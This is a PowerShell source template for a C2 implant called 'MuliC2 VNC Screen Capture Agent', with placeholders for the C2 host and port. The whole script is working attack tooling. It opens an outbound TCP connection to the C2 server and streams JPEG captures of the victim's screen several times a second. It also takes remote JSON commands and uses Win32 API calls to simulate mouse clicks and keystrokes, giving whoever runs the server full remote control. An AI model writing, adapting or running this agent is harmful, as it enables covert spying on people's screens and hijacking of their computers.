# MuliC2 VNC Screen Capture Agent - Plain TCP Version
# C2 Host: {{C2_HOST}}
# C2 Port: {{C2_PORT}}
# Generated: {{GENERATED_DATE}}

param( [string]$C2Host = "{{C2_HOST}}", [int]$C2Port = {{C2_PORT}} )

# Check if running as Administrator
function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Administrator)) {
    Write-Host "[!] WARNING: Not running as Administrator. Input simulation may fail!" -ForegroundColor Red
    Write-Host "[!] Consider running PowerShell as Administrator for full functionality." -ForegroundColor Yellow
}

function Start-Cleanup {
    if ($global:cleanupInProgress) { return }
    $global:cleanupInProgress = $true
    $global:isRunning = $false
    
    Write-Host "`n[*] Cleaning up resources..." -ForegroundColor Yellow
    
    try {
        if ($global:networkStream) {
            $global:networkStream.Close()
            $global:networkStream.Dispose()
        }
    } catch {
        Write-Host "[!] Error closing network stream: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    try {
        if ($global:tcpClient) {
            $global:tcpClient.Close()
            $global:tcpClient.Dispose()
        }
    } catch {
        Write-Host "[!] Error closing TCP client: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host "[+] Cleanup completed" -ForegroundColor Green
}

# Set up cleanup on exit
Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action { Start-Cleanup }
$null = Register-ObjectEvent -InputObject ([System.Console]) -EventName CancelKeyPress -Action { 
    Write-Host "`n[*] Received Ctrl+C, initiating cleanup..." -ForegroundColor Yellow
    Start-Cleanup
    [System.Environment]::Exit(0)
}

$global:tcpClient = $null
$global:networkStream = $null
$global:isRunning = $true
$global:cleanupInProgress = $false
$global:lastFrameTime = Get-Date

# Load required assemblies
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms

# Add Win32 API definitions
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32API {
    [DllImport("user32.dll")]
    public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
    [DllImport("user32.dll")]
    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
    [DllImport("user32.dll")]
    public static extern short VkKeyScan(char ch);
    [DllImport("user32.dll")]
    public static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")]
    public static extern bool GetCursorPos(out POINT lpPoint);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct POINT { public int X; public int Y; }
    
    public const int MOUSEEVENTF_LEFTDOWN = 0x0002;
    public const int MOUSEEVENTF_LEFTUP = 0x0004;
    public const int MOUSEEVENTF_RIGHTDOWN = 0x0008;
    public const int MOUSEEVENTF_RIGHTUP = 0x0010;
    public const int MOUSEEVENTF_MIDDLEDOWN = 0x0020;
    public const int MOUSEEVENTF_MIDDLEUP = 0x0040;
    public const uint KEYEVENTF_KEYUP = 0x0002;
}
"@

function Invoke-MouseEvent {
    param(
        [string]$event,
        [float]$x,
        [float]$y,
        [int]$button = 0
    )
    
    try {
        $realScreenWidth = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width
        $realScreenHeight = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height
        
        $px = [Math]::Round($x * $realScreenWidth)
        $py = [Math]::Round($y * $realScreenHeight)
        
        $px = [Math]::Max(0, [Math]::Min($px, $realScreenWidth - 1))
        $py = [Math]::Max(0, [Math]::Min($py, $realScreenHeight - 1))
        
        Write-Host "[*] Mouse ${event} at ($px, $py)" -ForegroundColor Cyan
        
        [Win32API]::SetCursorPos($px, $py)
        Start-Sleep -Milliseconds 25
        
        switch ($event) {
            'mousedown' {
                switch ($button) {
                    0 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0) }
                    2 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0) }
                    1 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0) }
                }
            }
            'mouseup' {
                switch ($button) {
                    0 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, 0, 0, 0, 0) }
                    2 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0) }
                    1 { [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0) }
                }
            }
            'click' {
                switch ($button) {
                    0 { 
                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
                        Start-Sleep -Milliseconds 50
                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
                    }
                    2 { 
                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)
                        Start-Sleep -Milliseconds 50
                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
                    }
                }
            }
        }
        
    } catch {
        Write-Host "[!] Mouse event failed: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Invoke-KeyboardEvent {
    param(
        [string]$event,
        [string]$key,
        [string]$code,
        [int]$keyCode,
        [bool]$ctrlKey = $false,
        [bool]$shiftKey = $false,
        [bool]$altKey = $false
    )
    
    try {
        Write-Host "[*] Keyboard ${event}: '$key'" -ForegroundColor Cyan
        
        if ($ctrlKey) { [Win32API]::keybd_event(0x11, 0, 0, [UIntPtr]::Zero) }
        if ($shiftKey) { [Win32API]::keybd_event(0x10, 0, 0, [UIntPtr]::Zero) }
        if ($altKey) { [Win32API]::keybd_event(0x12, 0, 0, [UIntPtr]::Zero) }
        
        Start-Sleep -Milliseconds 25
        
        $vkCode = 0
        switch ($key) {
            'Enter' { $vkCode = 0x0D }
            'Escape' { $vkCode = 0x1B }
            'Backspace' { $vkCode = 0x08 }
            'Tab' { $vkCode = 0x09 }
            'Delete' { $vkCode = 0x2E }
            'ArrowUp' { $vkCode = 0x26 }
            'ArrowDown' { $vkCode = 0x28 }
            'ArrowLeft' { $vkCode = 0x25 }
            'ArrowRight' { $vkCode = 0x27 }
            ' ' { $vkCode = 0x20 }
            default {
                if ($key.Length -eq 1) {
                    $vkResult = [Win32API]::VkKeyScan($key[0])
                    $vkCode = $vkResult -band 0xFF
                } elseif ($keyCode -ne 0) {
                    $vkCode = $keyCode
                }
            }
        }
        
        if ($vkCode -ne 0) {
            if ($event -eq 'keydown') {
                [Win32API]::keybd_event([byte]$vkCode, 0, 0, [UIntPtr]::Zero)
            } elseif ($event -eq 'keyup') {
                [Win32API]::keybd_event([byte]$vkCode, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
            } elseif ($event -eq 'keypress') {
                [Win32API]::keybd_event([byte]$vkCode, 0, 0, [UIntPtr]::Zero)
                Start-Sleep -Milliseconds 25
                [Win32API]::keybd_event([byte]$vkCode, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
            }
        } else {
            if ($key.Length -eq 1) {
                [System.Windows.Forms.SendKeys]::SendWait($key)
            }
        }
        
        Start-Sleep -Milliseconds 25
        
        if ($altKey) { [Win32API]::keybd_event(0x12, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero) }
        if ($shiftKey) { [Win32API]::keybd_event(0x10, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero) }
        if ($ctrlKey) { [Win32API]::keybd_event(0x11, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero) }
        
    } catch {
        Write-Host "[!] Keyboard event failed: $($_.Exception.Message)" -ForegroundColor Red
    }
}

try {
    Write-Host "[*] Connecting to MuliC2 server at ${C2Host}:${C2Port}..." -ForegroundColor Cyan
    $global:tcpClient = New-Object System.Net.Sockets.TcpClient
    $global:tcpClient.Connect($C2Host, $C2Port)
    
    # Use plain TCP stream (no SSL)
    $global:networkStream = $global:tcpClient.GetStream()
    $global:networkStream.ReadTimeout = 100
    $global:networkStream.WriteTimeout = 30000
    
    Write-Host "[+] TCP connection established (Plain TCP mode)" -ForegroundColor Green
    Write-Host "[*] Starting screen capture... (Press CTRL+C to exit gracefully)" -ForegroundColor Cyan
    Write-Host "[*] Capturing 800x600 resolution at 5 FPS" -ForegroundColor Gray

    $realScreenWidth = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width
    $realScreenHeight = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height
    $targetWidth = 800
    $targetHeight = 600
    
    Write-Host "[*] Screen: ${realScreenWidth}x${realScreenHeight} -> ${targetWidth}x${targetHeight}" -ForegroundColor Gray
    Write-Host "[*] Administrator: $(Test-Administrator)" -ForegroundColor Gray
    
    while ($global:isRunning -and $global:networkStream.CanRead) {
        $currentTime = Get-Date
        
        # Handle input events
        try {
            if ($global:networkStream.DataAvailable) {
                # Read message length
                $lengthBytes = New-Object byte[] 4
                $totalRead = 0
                while ($totalRead -lt 4 -and $global:networkStream.DataAvailable) {
                    $bytesRead = $global:networkStream.Read($lengthBytes, $totalRead, 4 - $totalRead)
                    if ($bytesRead -eq 0) { break }
                    $totalRead += $bytesRead
                }
                
                if ($totalRead -eq 4) {
                    $msgLength = [BitConverter]::ToInt32($lengthBytes, 0)
                    if ($msgLength -gt 0 -and $msgLength -le 8192) {
                        # Read message data
                        $msgBytes = New-Object byte[] $msgLength
                        $totalRead = 0
                        while ($totalRead -lt $msgLength) {
                            $bytesRead = $global:networkStream.Read($msgBytes, $totalRead, $msgLength - $totalRead)
                            if ($bytesRead -eq 0) { break }
                            $totalRead += $bytesRead
                        }
                        
                        if ($totalRead -eq $msgLength) {
                            $json = [System.Text.Encoding]::UTF8.GetString($msgBytes, 0, $msgLength)
                            Write-Host "[RX] $json" -ForegroundColor Magenta
                            
                            try { 
                                $inputEvent = $json | ConvertFrom-Json 
                                
                                if ($inputEvent.type -eq 'mouse') {
                                    Invoke-MouseEvent $inputEvent.event $inputEvent.x $inputEvent.y $inputEvent.button
                                } elseif ($inputEvent.type -eq 'keyboard') {
                                    Invoke-KeyboardEvent $inputEvent.event $inputEvent.key $inputEvent.code $inputEvent.keyCode $inputEvent.ctrlKey $inputEvent.shiftKey $inputEvent.altKey
                                } elseif ($inputEvent.type -eq 'test' -and $inputEvent.event -eq 'show_messagebox') {
                                    try {
                                        [System.Windows.Forms.MessageBox]::Show("Input test successful! Clicks should work.", "MuliC2 VNC Agent", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
                                        Write-Host "[+] Test MessageBox displayed" -ForegroundColor Green
                                    } catch {
                                        Write-Host "[!] MessageBox failed: $($_.Exception.Message)" -ForegroundColor Red
                                    }
                                }
                            } catch { 
                                Write-Host "[!] JSON parse error: $($_.Exception.Message)" -ForegroundColor Red
                            }
                        }
                    }
                }
            }
    } catch {
            Write-Host "[!] Input read error: $($_.Exception.Message)" -ForegroundColor Yellow
        }
        
        # Send screen frame every ~200ms (5 FPS)
        if (($currentTime - $global:lastFrameTime).TotalMilliseconds -ge 200) {
            try {
                $bmpFull = New-Object System.Drawing.Bitmap $realScreenWidth, $realScreenHeight
                $graphicsFull = [System.Drawing.Graphics]::FromImage($bmpFull)
                $graphicsFull.CopyFromScreen(0, 0, 0, 0, $bmpFull.Size)
                
                $bmp = New-Object System.Drawing.Bitmap $targetWidth, $targetHeight
                $graphics = [System.Drawing.Graphics]::FromImage($bmp)
                $graphics.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
                $graphics.DrawImage($bmpFull, 0, 0, $targetWidth, $targetHeight)
                
                $ms = New-Object System.IO.MemoryStream
                $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $frameBytes = $ms.ToArray()
                
                $ms.Dispose()
                $graphics.Dispose()
                $bmp.Dispose()
                $graphicsFull.Dispose()
                $bmpFull.Dispose()
                
                $lenBytes = [BitConverter]::GetBytes([int]$frameBytes.Length)
                $global:networkStream.Write($lenBytes, 0, 4)
                $global:networkStream.Write($frameBytes, 0, $frameBytes.Length)
                $global:networkStream.Flush()
                
                $global:lastFrameTime = $currentTime
                
            } catch {
                Write-Host "[!] Screen capture error: $($_.Exception.Message)" -ForegroundColor Red
            }
        }
        
        Start-Sleep -Milliseconds 10
    }

} catch {
    Write-Host "[!] Connection error: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "[!] Make sure MuliC2 listener is running on ${C2Host}:${C2Port}" -ForegroundColor Red
} finally {
    Start-Cleanup
}